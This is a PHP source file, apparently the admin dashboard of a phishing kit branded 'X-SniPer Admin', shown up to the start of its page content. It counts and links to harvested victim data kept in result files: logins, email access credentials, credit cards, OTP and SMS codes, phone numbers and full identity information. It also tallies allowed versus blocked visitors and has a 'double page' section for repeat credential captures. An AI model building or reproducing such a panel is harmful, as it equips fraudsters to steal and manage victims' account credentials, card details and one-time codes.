<?php session_start(); 

require("../ElZero/ElZero.php");


if (!isset($_SESSION['passwordAdmin'])) {
      // echo "Error Here1";
    header("Location: ./login");  
}

if (isset($_SESSION['passwordAdmin'])) {
    if ($_SESSION['passwordAdmin']  != $adminPanelPass) {
      header("Location: ./login");  
      
    }
}


$fileVisitorsAll = file_get_contents("result/all.txt");
$AllVisitors = preg_split('/\n/',$fileVisitorsAll);
$countAll = count($AllVisitors)-1; 

// Allowed
$fileVisitors = file_get_contents("result/allowed.txt");
$allowedVisitors = preg_split('/\n/',$fileVisitors);
$countallowed = count($allowedVisitors)-1;

// Blocked Visitors
$blocked = $countAll - $countallowed;

// Logins
$fileLogins = file_get_contents("result/logins.txt");
$loginsSplit = preg_split('/\n/',$fileLogins);
$countLogins = count($loginsSplit)-1;

// EmailAccess
$fileEmail = file_get_contents("result/emailAccess.txt");
$EmailSplit = preg_split('/\n/',$fileEmail);
$countEmail = count($EmailSplit)-1;

// CreditCard
$filecredit = file_get_contents("result/credit.txt");
$creditSplit = preg_split('/\n/',$filecredit);
$countcredit = count($creditSplit)-1;

// Info
$fileInfo = file_get_contents("result/info.txt");
$InfoSplit = preg_split('/\n/',$fileInfo);
$countInfo = count($InfoSplit)-1;

// Douple Login
$fileLogins2 = file_get_contents("result/doubleLogins.txt");
$loginsSplit2 = preg_split('/\n/',$fileLogins2);
$countLogins2 = count($loginsSplit2)-1;

// Douple EmailAccess
$fileEmail2 = file_get_contents("result/doubleEmailAccess.txt");
$EmailSplit2 = preg_split('/\n/',$fileEmail2);
$countEmail2 = count($EmailSplit2)-1;

// Douple CreditCard
$filecredit2 = file_get_contents("result/doubleCredit.txt");
$creditSplit2 = preg_split('/\n/',$filecredit2);
$countcredit2 = count($creditSplit2)-1;



$countTel = file_get_contents("result/telephone.txt");
$countTel = preg_split('/\n/',$countTel);
$countTel = count($countTel)-1;

$countOTP = file_get_contents("result/sms.txt");
$countOTP = preg_split('/\n/',$countOTP);
$countOTP = count($countOTP)-1;


$countFullInfo = file_get_contents("result/fullInfo.txt");
$countFullInfo = preg_split('/\n/',$countFullInfo);
$countFullInfo = count($countFullInfo)-1;


  ?>
<!DOCTYPE html>
<html>
  <head> 
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Admin Panel </title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <!-- Bootstrap CSS-->
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
    <!-- Font Awesome CSS-->
    <link rel="stylesheet" href="vendor/font-awesome/css/font-awesome.min.css">
    <!-- Custom Font Icons CSS-->
    <link rel="stylesheet" href="css/font.css">
    <!-- Google fonts - Muli-->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:300,400,700">
    <!-- theme stylesheet-->
    <link rel="stylesheet" href="css/style.default.css" id="theme-stylesheet">
    <!-- Custom stylesheet - for your changes-->
    <link rel="stylesheet" href="css/custom.css">
    <!-- Favicon-->
    <link rel="shortcut icon" href="img/favicon.ico">
    <!-- Tweaks for older IEs--><!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
        <style type="text/css">
          nav#sidebar li a:hover {
              background: #141b2b;
          }
          .dashtext-4 {
              color: #27aca6 !important;
          }
          .statistic-block , .block , nav#sidebar , nav.navbar , .page-header,nav#sidebar li li a {
            background:#202940; 
          }
      
          .page-content ,nav.navbar .sidebar-toggle,nav#sidebar a[aria-expanded="true"] {
            background: #171b27;
    
          }
          .table-striped tbody tr:nth-of-type(odd) {
            background-color: #171b27;
          }
          .table-striped tbody tr:nth-of-type(odd):hover,nav#sidebar li li a:hover {
            background-color: #10141f;
          }
          nav#sidebar li.active > a {
                background: #10141f;
                color: #bfc1c4;
            }
            nav#sidebar .avatar {
                width: 80px;
                height: 80px;
                /*margin-right: 20px;*/
                padding: 3px;
                border: 3px solid #e95f71;
            }

            nav#sidebar span.heading {
                font-weight: 800;
                margin-left: 20px;
                color: #DB6574;
                font-size: 1.5rem;
                margin-bottom: 20px;
            }
        </style>
  </head>
  <body>
    <header class="header">   
      <nav class="navbar navbar-expand-lg">
       
        <div class="container-fluid d-flex align-items-center justify-content-between">
          <div class="navbar-header">
            <!-- Navbar Header--><a href="home" class="navbar-brand">
              <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">X-SniPer</strong><strong>Admin</strong></div>
              <div class="brand-text brand-sm"><strong class="text-primary">X</strong><strong>Z</strong></div></a>
            <!-- Sidebar Toggle Btn-->
            <button class="sidebar-toggle"><i class="fa fa-long-arrow-left"></i></button>
          </div>
          <div class="right-menu list-inline no-margin-bottom">    
            

             
            <div class="list-inline-item dropdown"><a href="" rel="nofollow" class="nav-link language "><span class="d-none d-sm-inline-block">Refersh</span> <i class="fas fa-sync-alt"></i></a>
              
            </div>
            <div class="list-inline-item logout"><a id="logout" href="exit" class="nav-link">Logout <i class="icon-logout"></i></a></div>
          </div>
        </div>
      </nav>
    </header>
    <div class="d-flex align-items-stretch">
      <!-- Sidebar Navigation-->
      <nav id="sidebar">
        <!-- Sidebar Header-->
        <div class="sidebar-header d-flex align-items-center">
          <div class="avatar"><img src="data:image/jpeg;base64,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" alt="..." class="img-fluid rounded-circle"></div>
          <div class="title">
            <h1 class="h5"><?php echo $YourName; ?></h1>
            
          </div>
        </div>
        
        <span class="heading">[+] Admin Panel [+]</span>
        <ul class="list-unstyled">
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"home")){echo "active";}?>'><a href="home"> <i class="icon-home"></i>DashBoard </a></li>
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"logins")){echo "active";}?>'><a href="logins"> <i class="fas fa-sign-in-alt"></i> Logins &nbsp; <span class="badge badge-success"> <?php echo $countLogins; ?> </span></a></li>
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"emailAccess")){echo "active";}?>'><a href="emailAccess"> <i class="fas fa-envelope-open-text"></i>Email Access &nbsp; <span class="badge badge-success"> <?php echo $countEmail; ?> </span> </a></li>
                <li><a href="#exampledropdownDropdown" aria-expanded="false" data-toggle="collapse"> <i class="icon-windows"></i>OTP </a>
                  <ul id="exampledropdownDropdown" class="collapse list-unstyled ">
                    <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"credit")){echo "active";}?>'><a href="telephone">Telephone &nbsp; <span class="badge badge-success"> <?php echo $countTel; ?></a></li>
                    <li><a href="sms">OTP &nbsp; <span class="badge badge-success"> <?php echo $countOTP; ?> </span></a></li>
                  </ul>
                </li>  
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"credit")){echo "active";}?>'><a href="credit"> <i class="far fa-credit-card"></i>Credit  &nbsp; <span class="badge badge-success"> <?php echo $countcredit; ?> </span></a></li>
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"info")){echo "active";}?>'><a href="info"> <i class="far fa-file-alt"></i>Info &nbsp; <span class="badge badge-success"> <?php echo $countInfo; ?> </span></a></li>
                <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"fullInfo")){echo "active";}?>'><a href="fullInfo"> <i class="far fa-file-alt"></i>Full Info &nbsp; <span class="badge badge-success"> <?php echo $countFullInfo; ?> </span></a></li>
                    
                
        </ul>
        <span class="heading">Double Page</span>
        <ul class="list-unstyled">
          <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"doubleLogins")){echo "active";}?>' > <a href="doubleLogins"> <i class="fas fa-sign-in-alt"></i>2) Logins &nbsp; <span class="badge badge-success"> <?php echo $countLogins2; ?> </span> </a></li>
          <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"doubleEmailAccess")){echo "active";}?>' > <a href="doubleEmailAccess"> <i class="fas fa-envelope-open-text"></i>2) Email Acceess &nbsp; <span class="badge badge-success"> <?php echo $countEmail; ?> </span> </a></li>
          <li class='<?php  if (strpos($_SERVER['PHP_SELF'] ,"doubleCredit")){echo "active";}?>' > <a href="doubleCredit"> <i class="far fa-credit-card"></i>2) Credit &nbsp; <span class="badge badge-success"> <?php echo $countcredit2; ?> </span></a></li>
          <li><a href=""> <i class="fas fa-sync-alt"></i>Refresh </a></li>
          <li ><a href="delete"> <i class="far fa-trash-alt"></i>Delete Result &nbsp; <span class="badge badge-danger"> All </span></a></li>
        </ul>

      </nav>
      <div class="page-content">